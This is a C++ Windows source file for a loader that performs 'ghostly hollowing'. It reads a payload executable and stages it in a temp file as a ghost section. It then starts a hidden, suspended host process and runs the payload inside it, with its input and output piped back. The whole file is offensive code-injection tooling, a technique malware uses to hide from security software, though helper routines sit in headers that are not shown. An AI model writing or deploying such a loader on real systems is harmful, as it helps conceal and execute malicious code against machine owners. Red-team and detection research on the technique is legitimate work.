#include <Pipes.h>
#include <FileIO.h>
#include <HollowingVariations.h>
#include <iostream>

#define EXIT_IF_HANDLE_INVALID( x ) if( x == INVALID_HANDLE_VALUE ) \
				    {	return EXIT_FAILURE;        \
				    }				    \

BOOL CreateHollowedProcess(_In_ LPWSTR CommandLine, _Inout_ PPROCESS_INFORMATION* HollowedProcess)
{
	STARTUPINFOW StartupInfo{};
	StartupInfo.cb		    = sizeof(STARTUPINFOW);
	StartupInfo.hStdError   = StartupInfo.hStdOutput = ChildStdoutW;
	StartupInfo.hStdInput   = ChildStdinR;
	StartupInfo.wShowWindow = SW_HIDE;
	StartupInfo.dwFlags	   |= (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);

	if (!CreateProcessW(NULL, CommandLine, NULL, NULL, TRUE, (CREATE_SUSPENDED | CREATE_NEW_CONSOLE), NULL, NULL, &StartupInfo, *HollowedProcess))
	{
		return FALSE;
	}

	CloseHandle(ChildStdoutW);
	CloseHandle(ChildStdinR);
	return TRUE;
}

INT wmain(INT argc, PWCHAR argv[])
{	
	if (argc < 2)
	{
		std::wcerr << "\nUsage: " << argv[0] << "<Path to payload> <Path to image> <Arg1>...<ArgN> \n";
	}

	std::wstring CommandLine;
	for (INT i = 2; i < argc; i++)
	{
		CommandLine += argv[i];
		CommandLine += L" ";
	}

	HANDLE TempFile{ CreateTempFile() };
	EXIT_IF_HANDLE_INVALID(TempFile)

	HANDLE PayloadFile{ CreateFileW(argv[1], GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)};
	EXIT_IF_HANDLE_INVALID(PayloadFile)

	DWORD  PayloadSize{};
	LPVOID PayloadAddress{ ReadPayload(PayloadFile, &PayloadSize)};
	if (PayloadAddress == NULL)
	{
		return EXIT_FAILURE;
	}

	DWORD BytesWritten{};

	if (!WriteFile(TempFile, PayloadAddress, PayloadSize, &BytesWritten, NULL) || BytesWritten != PayloadSize)
	{
		return EXIT_FAILURE;
	}

	CloseHandle(PayloadFile);

	HANDLE GhostSection{ CreateGhostSection(TempFile) };
	EXIT_IF_HANDLE_INVALID(GhostSection)

	if (!CreatePipes())
	{
		return EXIT_FAILURE;
	}

	PROCESS_INFORMATION HollowedProcess{};
	PPROCESS_INFORMATION HollowedProcessPtr{ &HollowedProcess };

	if (!CreateHollowedProcess(CommandLine.data(), &HollowedProcessPtr))
	{
		return EXIT_FAILURE;
	}

	if (!GhostlyHollowing(HollowedProcess, GhostSection, PayloadAddress))
	{
		return EXIT_FAILURE;
	}

	HANDLE ReadPipeThread { CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReadFromPipe, NULL, 0, NULL) };
	HANDLE WritePipeThread{ CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WriteToPipe, NULL, 0, NULL) };

	if (ReadPipeThread == NULL || WritePipeThread == NULL)
	{
		return EXIT_FAILURE;
	}

	WaitForSingleObject(ReadPipeThread, INFINITE);

	return EXIT_SUCCESS;
}
